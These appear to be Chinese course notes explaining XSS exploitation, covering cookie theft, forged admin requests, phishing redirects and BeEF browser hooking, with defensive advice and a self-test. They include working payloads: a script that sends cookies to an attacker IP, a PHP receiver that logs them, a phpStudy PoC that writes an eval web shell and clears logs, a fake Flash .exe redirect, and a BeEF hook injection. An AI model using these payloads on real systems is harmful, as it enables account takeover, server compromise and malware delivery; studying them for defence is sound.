## 0. 先看这张地图

这四种利用手法,是按"危害递进"排列的——从"偷一个凭证"到"完全接管浏览器",理解它们能让你真正明白 XSS 为什么是高危漏洞,而不只是"一个弹窗"。

| 利用手法 | 相关度 | 核心目的 | 适用前提 |
|---|---|---|---|
| 凭据盗取(Cookie 窃取) | 🔴 核心 | 偷到 Cookie → 接管受害者账号 | Cookie 没加 HttpOnly |
| 数据提交(模拟请求) | 🔴 核心 | 冒充受害者身份发请求搞破坏 | Cookie 偷不到/有防护时的替代方案 |
| 网络钓鱼 | 🟡 辅助 | 借 XSS 的"可信域名"投放钓鱼内容 | 配合社会工程 |
| 浏览器控制(BeEF) | 🔴 核心 | 把受害者浏览器变成可持续操控的"肉鸡" | 需部署 BeEF 服务 |

**一条主线串起来**:这四种手法其实是"XSS 能执行任意 JS"之后的不同变现方式。既然你能在受害者浏览器里跑任意 JS,那么——JS 能读 Cookie(→ 盗取凭据)、JS 能发请求(→ 数据提交)、JS 能改页面/跳转(→ 钓鱼)、JS 能和你的服务器持续通信(→ 浏览器控制)。**全部回到一个根:你借 XSS 获得了"在受害者浏览器里执行代码"的能力。**

**前置知识**:必须先理解《身份验证机制笔记》里讲的 Cookie 是什么、为什么偷到 Cookie 约等于接管账号,以及 HttpOnly 的作用。本篇反复用到这些。

## 1. 凭据盗取:Cookie 窃取(🔴 核心)

### 1.1 它是什么

利用 XSS 执行的 JS,读取受害者当前的 Cookie,把它偷偷发送到攻击者自己的服务器。拿到 Cookie 后,攻击者把它设置进自己的浏览器,就能**以受害者的身份直接登录,无需密码**(回忆《身份验证机制笔记》:Cookie 往往就是登录凭证,谁持有谁就是"你")。

### 1.2 为什么能成立(root cause)

两个条件:
1. **存在可执行 JS 的 XSS 点**(尤其是存储型,能自动命中所有访问者)。
2. **目标 Cookie 没有设置 `HttpOnly` 标志**——这是关键。如果 Cookie 设了 HttpOnly,JavaScript 的 `document.cookie` 就**读不到它**,这条路直接断掉(详见《身份验证机制笔记》《XSS跨站-原理与三大类型》的防御部分)。所以这个手法的前提明确写着"无防护 Cookie 凭据获取"。

### 1.3 怎么做(payload 逐段拆解)

**注入端(受害者浏览器执行的 JS)**:
```javascript
<script>
var url='http://xx.xx.xx.xx/getcookie.php?u='+window.location.href+'&c='+document.cookie;
document.write("<img src="+url+" />");
</script>
```

| 片段                                                            | 作用                                         | 为什么这么写                                                                                                                                                                                                   |
| ------------------------------------------------------------- | ------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `document.cookie`                                             | 读取受害者当前页面的 Cookie                          | 这是整个攻击的核心目标——偷的就是它(前提是没 HttpOnly)                                                                                                                                                                        |
| `window.location.href`                                        | 读取受害者当前所在的 URL                             | 顺便记录"这个 Cookie 是在哪个页面偷到的",方便攻击者知道该去哪用                                                                                                                                                                    |
| `'http://xx.xx.xx.xx/getcookie.php?u=...&c='+document.cookie` | 把 URL 和 Cookie 拼成一个指向**攻击者服务器**的地址,作为参数带过去 | 这是"数据外带"——把偷到的东西通过 URL 参数的形式发出去(和《MySQL高权限注入利用笔记》里 DNSLog 外带的思路相通:都是把数据藏在一个会发起网络请求的东西里)                                                                                                                  |
| `document.write("<img src="+url+" />")`                       | 在页面上写一个 `<img>` 标签,src 指向那个攻击者地址           | **精妙点**:浏览器为了加载这个"图片",会自动向 src 发起一次 HTTP 请求——于是 Cookie 就随着这次"加载图片"的请求被发到了攻击者服务器。用 `<img>` 是因为它加载图片不需要用户任何操作、也不会报跨域错误 浏览器一看到 `<img src="某地址">`,就会**自动向那个 src 地址发起一个 HTTP 请求**去下载图片——这是浏览器天生的行为,不需要用户点任何东西 |

**接收端(攻击者服务器上的 PHP)**:
```php
<?php
$url=$_GET['u'];           // 接收受害者的 URL
$cookie=$_GET['c'];         // 接收偷到的 Cookie
$fp = fopen('cookie.txt',"a");          // 打开一个文件(追加模式)
fwrite($fp,$url."|".$cookie."\n");      // 把 URL 和 Cookie 写进文件
fclose($fp);
?>
```
**翻译**:这个 PHP 脚本架在攻击者服务器上,专门负责"接住"偷来的数据——从 URL 参数里取出 Cookie,写进一个 `cookie.txt` 文件存起来。攻击者只要打开这个文件,就能看到所有中招者的 Cookie。

### 1.4 用现成的 XSS 平台代替手写

手写接收代码麻烦,实战中常用现成的 **XSS 平台**——它们把"生成 payload + 接收数据 + 展示结果"做成了一个 Web 后台:

- 原理:平台生成一段 JS(相当于上面注入端的升级版),你把它打进 XSS 点;受害者触发后,偷到的 Cookie/截图/各种信息自动回传到平台后台,可视化展示。
- 课程用的是 **BlueLotus_XSSReceiver**(github.com/epoch99/BlueLotus_XSSReceiver-master)——简单配置即可用,无需数据库和其他组件。

### 1.5 实战怎么用 / 易错点

- **什么时候该想到它**:确认了 XSS(尤其存储型)后,先用 `alert(document.cookie)` 看能不能读到 Cookie——**能读到(说明没 HttpOnly)才走这条路**。
- **易错点**:现代网站的会话 Cookie **大多已经设了 HttpOnly**,所以纯 Cookie 窃取的成功率在逐年下降。读不到 Cookie 不代表 XSS 没价值——这时候就该转向下一节的"数据提交"手法。

### 1.6 防御视角

防御核心就一条:**给会话 Cookie 加上 `HttpOnly` 标志**,让 JS 读不到它。这是性价比最高的 XSS 减损措施——即使 XSS 成立,也偷不走会话。配合 CSP 进一步限制脚本行为。

## 2. 数据提交:模拟请求(🔴 核心)

### 2.1 它是什么——比偷 Cookie 更狠的思路

当 Cookie 偷不到(有 HttpOnly)或者偷到也用不了(有其他防护,比如绑定 IP)时,还有一个更直接的思路:**既然我能在你浏览器里执行 JS,那我干脆不偷你的凭证了——我直接用你的浏览器、带着你已经登录的身份,去发起我想要的请求。**

**关键认知**:JS 在受害者浏览器里发请求时,浏览器会**自动带上该站的 Cookie**(包括 HttpOnly 的——因为浏览器自动携带 ≠ JS 读取)。所以攻击者根本不需要"看到"Cookie,只需要"借用"受害者已登录的会话去发请求。这就绕过了 HttpOnly 的限制。

### 2.2 为什么它能绕过 HttpOnly(root cause)

这是本节最重要的认知,很多人会混淆:
- **HttpOnly 挡的是"JS 读取 Cookie"**(`document.cookie` 读不到)。
- **HttpOnly 不挡"浏览器自动携带 Cookie 发请求"**——你用 JS 发一个 `$.post('/xxx')`,浏览器照样自动把 HttpOnly 的会话 Cookie 带上。

所以:偷 Cookie 这条路被 HttpOnly 封死了,但"冒充身份发请求"这条路 HttpOnly 封不了。攻击者的恶意 JS 就相当于"坐在受害者已登录的浏览器里,替他点按钮、提交表单"。

### 2.3 怎么做(演示:向后台计划任务写入后门)

课程演示的是小皮面板(phpStudy 的管理面板)存储型 XSS,利用"计划任务"功能写入 Web Shell。逐段看这个 PoC 在干什么:

```javascript
function save(){
  var data=new Object();
  data.title="test";
  // ... 一堆计划任务的时间参数(分、时、天、周)...
  data.shell='echo "<?php @eval($_POST[123]);?>" > C:/xp.cn/www/.../1.php';  // ← 核心
  $.post('/service/app/tasks.php?type=save_shell', data, function(res){
    poc();   // 保存后立刻去执行它
  },'json');
}
```

**逐步翻译整个攻击链**:
1. **`save()` 函数**:用 `$.post` 向后台的"创建计划任务"接口发请求,创建一个计划任务。这个任务的内容(`data.shell`)是一条系统命令:`echo "一句话木马" > 网站目录/1.php`——也就是**往网站目录写一个 Web Shell 文件**(和《MySQL高权限注入利用笔记》里 `INTO OUTFILE` 写 Shell 异曲同工,只是这里是借计划任务功能写)。
2. **`poc()` 函数**:任务创建后,立刻再发请求去**执行这个计划任务**(`type=exec_task`),让那条写 Shell 的命令真正运行。
3. **清理日志**:执行完后,再发一个请求 `type=clearlog` 清掉操作日志,**抹掉痕迹**。

**整条链的本质**:管理员打开了带有这段恶意 JS 的页面(存储型 XSS 触发),于是这段 JS **以管理员的身份**,自动完成了"创建计划任务→执行→写入 Web Shell→清日志"全套操作。管理员全程毫不知情,但他的后台已经被种了 Shell。

### 2.4 为什么这个手法威力巨大

- **绕过 HttpOnly**:全程不读 Cookie,只借身份发请求。
- **借用最高权限**:如果中招的是**管理员**(存储型 XSS 打后台,即"XSS 盲打"),那这段 JS 就以管理员权限操作,能干的事远超普通用户——上面的写 Shell 就是典型,直接从"前端 XSS"升级成了"服务器控制权"。
- 这完美呼应《SRC漏洞挖掘经验》里讲的:存储型 XSS 如果能打到管理员后台,危害是顶级的。

### 2.5 实战怎么用 / 易错点

- **什么时候该想到它**:Cookie 有 HttpOnly 偷不到时、或者想直接搞破坏性操作时。
- **前提**:需要**熟悉目标后台的业务功能和数据包**——你得先知道"创建计划任务的接口长什么样、要传什么参数",才能用 JS 模拟出这个请求。所以这一步往往需要你自己先有一个该系统的测试环境,把正常操作的数据包抓下来研究清楚,再改写成 JS。
- **易错点**:这类 PoC 高度依赖目标系统的具体接口,不能照搬——课程这个是针对小皮面板的,换个系统要重新分析它的接口。

### 2.6 防御视角

- 根治 XSS(输出编码)是根本。
- 针对"借身份发请求"这一特性,防御手段是 **CSRF Token**(关键操作要求请求带一个 JS 读不到的随机令牌)和 **CSP**(限制页面能发请求的目标)。但注意:如果 XSS 已经成立,攻击者的 JS 运行在页面内,很多 CSRF 防护也会被绕过——所以**最根本还是别让 XSS 发生**。

## 3. 网络钓鱼(🟡 辅助)

### 3.1 它是什么

借助 XSS 能"在可信网站上执行 JS、改页面、跳转"的能力,投放钓鱼内容。因为内容出现在受害者信任的正规域名下,欺骗性比普通钓鱼网站强得多。

### 3.2 典型手法(payload 拆解)

课程给的"假 Flash 升级"钓鱼:
```javascript
<script>
alert('当前浏览器Flash版本过低,请下载升级！');
location.href='http://x.x.x.x/flash.exe'
</script>
```
**翻译**:XSS 触发后,先弹一个"你的 Flash 太旧了,请升级"的提示框骗取信任,然后 `location.href` 把受害者**跳转到攻击者服务器上的一个恶意 exe**(伪装成 Flash 升级包)。受害者以为是正规网站让他升级,就下载运行了——实际是木马。

> [!note] 🔎 补充(非原笔记内容)
> 这个具体例子有点过时了——Flash 已于 2020 年底全面停用(见《XSS跨站-框架与浏览器层变体》),"Flash 升级"的话术今天已经骗不到人。但**它的思路依然成立**:利用 XSS 在可信站上弹出一个"看似来自官方"的诱导提示 + 跳转下载。现代的变体可能是伪装成"浏览器安全更新""必装插件""账号异常需验证"等。思路学会了,话术可以与时俱进。

### 3.3 相关度说明

钓鱼本身是一个独立的大方向(社会工程学、钓鱼页面制作、木马免杀捆绑),课程也说了"可在后续红队钓鱼篇章学习"。在 XSS 这里,只需理解"XSS 可以作为钓鱼的投放载体"这个结合点即可,不展开。文件捆绑免杀等属于红队专题。

## 4. 浏览器控制:BeEF(🔴 核心)

### 4.1 它是什么

BeEF(Browser Exploitation Framework,浏览器利用框架)把 XSS 的危害推到极致——它不是偷一次 Cookie、发一次请求就结束,而是让受害者浏览器**和攻击者的 BeEF 服务器建立一个持续的连接**,攻击者可以**像遥控器一样,持续地对受害者浏览器下发各种命令**(截图、获取信息、弹钓鱼框、尝试进一步攻击等)。

> 类比:前面的手法像"打一枪就跑",BeEF 像"在受害者浏览器里装了个持续在线的遥控后门",攻击者能反复操控。

### 4.2 为什么能做到(root cause)

核心是一个叫 **`hook.js`** 的 JS 文件。你通过 XSS 让受害者浏览器加载并执行了这个 `hook.js`,它就会:
1. 在受害者浏览器里**持续运行**,定期和 BeEF 服务器"通信心跳"(通过 XHR/WebSocket)。
2. 把受害者浏览器登记为一个"已上钩(hooked)的浏览器",显示在 BeEF 的控制面板上。
3. 持续**接收** BeEF 服务器下发的命令模块并执行,再把结果**回传**。

本质还是那句话——**它只是一段通过 XSS 注入、并且"赖着不走"持续运行的 JS**,利用的还是 XSS"能执行任意 JS"这个根本能力,只不过这段 JS 被设计成了一个功能强大的远控客户端。

### 4.3 怎么做(搭建与使用)

> [!note] 🔎 补充(工具现状经联网核实,2026)
> BeEF 至今仍是主流的浏览器利用框架,**Kali Linux 自带**。现在推荐的安装/启动方式比课程里的 docker 更简单:
> ```bash
> sudo apt install beef-xss      # Kali 下直接装(自带也可直接用)
> sudo beef-xss                   # 启动(首次会要求改默认密码)
> ```
> 课程笔记里用的 docker 方式(`docker run ... janes/beef`)也能用,但属于较旧的部署方式。
>
> 启动后终端会显示两个关键地址:
> - **控制面板**:`http://<IP>:3000/ui/panel`(默认账号 beef/beef,新版强制要求首次改密码)
> - **Hook 地址**:`http://<IP>:3000/hook.js`

**使用流程**:
1. 启动 BeEF,拿到 `hook.js` 的地址。
2. 通过 XSS 点注入:`<script src="http://<你的IP>:3000/hook.js"></script>`。
3. 受害者浏览器触发 XSS、加载 hook.js → 在 BeEF 控制面板左侧出现一个"已上钩的浏览器"。
4. 攻击者在面板里对这个浏览器下发各种命令模块。

### 4.4 实战/溯源意义

课程把 BeEF 归在"溯源综合"下——它不仅是攻击工具,也体现了"XSS 能把浏览器变成攻击跳板/持续控制点"这个完整的危害图景。理解 BeEF 能帮你真正建立"XSS = 浏览器层面的完全失守"这个认知,而不只是"弹个窗"。

### 4.5 防御视角

- 根治 XSS(输出编码、CSP)依然是根本——没有 XSS,hook.js 就注入不进去。
- CSP 的 `script-src` 如果配置严格(只允许自己域名的脚本),能挡住 `<script src="外部BeEF地址">` 这种从外部加载脚本的注入,是针对 BeEF 这类"外链脚本"攻击的有效防线。

## 5. 把它串起来:XSS 利用的危害递进图

```
确认 XSS(能执行任意 JS)
        ↓  能执行 JS 之后,看能变现成什么:
        │
   能读 Cookie 吗?(没 HttpOnly?)
        ├─ 能 → 【凭据盗取】偷 Cookie → 接管账号(§1)
        └─ 不能(有 HttpOnly)↓
        │
   不读 Cookie,直接借身份发请求
        └→ 【数据提交】冒充受害者(尤其管理员)发请求 → 写 Shell/搞破坏(§2)
           (绕过 HttpOnly,威力最大)
        │
   想骗受害者下载/输入?
        └→ 【网络钓鱼】借可信域名投放诱导内容(§3)
        │
   想持续操控受害者浏览器?
        └→ 【BeEF】注入 hook.js → 浏览器变"肉鸡",持续遥控(§4)

全部的根:XSS 让你能在受害者浏览器里执行任意 JS。
```

**一句话收束**:这四种手法彻底回答了"XSS 弹窗之后能干嘛"——从偷凭证到接管账号,从冒充身份搞破坏到种 Shell,从钓鱼到完全遥控浏览器。这就是为什么 XSS 是高危漏洞,也是为什么报告 XSS 时要讲清楚"实际能造成什么危害"(呼应《XSS跨站-原理与三大类型》的易错点)。

## 6. 自测(先自己想,再看答案)

1. 一个网站的会话 Cookie 设置了 HttpOnly,是不是就说明"即使有 XSS 也没危害了"?为什么?
2. 用自己的话解释:为什么"数据提交(模拟请求)"这个手法能绕过 HttpOnly,而"Cookie 窃取"不能?
3. BeEF 的 hook.js 本质上是什么?它利用的是 XSS 的哪个根本能力?

<details>
<summary>参考答案</summary>

1. 不是。HttpOnly 只挡住了"偷 Cookie"这一条路(JS 读不到 Cookie),但挡不住"数据提交"手法——攻击者的 JS 可以不读 Cookie,直接借受害者已登录的会话去发请求(浏览器会自动携带 HttpOnly 的 Cookie),照样能以受害者身份搞破坏,尤其打到管理员时能写 Shell。所以 HttpOnly 是重要的减损措施,但不等于"有 XSS 也无害"。
2. 因为 HttpOnly 的作用范围是"禁止 JavaScript 用 document.cookie 读取 Cookie"——所以依赖"读 Cookie"的窃取手法被它封死。但 HttpOnly 不影响"浏览器自动携带 Cookie 发请求"这个行为:JS 发一个请求时,浏览器照样会把 HttpOnly 的会话 Cookie 带上。数据提交手法根本不需要"看到"Cookie,只需要"借用"受害者的登录状态发请求,所以绕过了 HttpOnly。
3. hook.js 本质上就是一段通过 XSS 注入、并且持续运行、不断和攻击者 BeEF 服务器通信的 JavaScript(一个远控客户端)。它利用的是 XSS 最根本的能力——"能在受害者浏览器里执行任意 JS"。所有 XSS 利用手法(偷 Cookie、发请求、钓鱼、BeEF)的根都是这一个能力,只是把这段 JS 写成了不同用途。

</details>
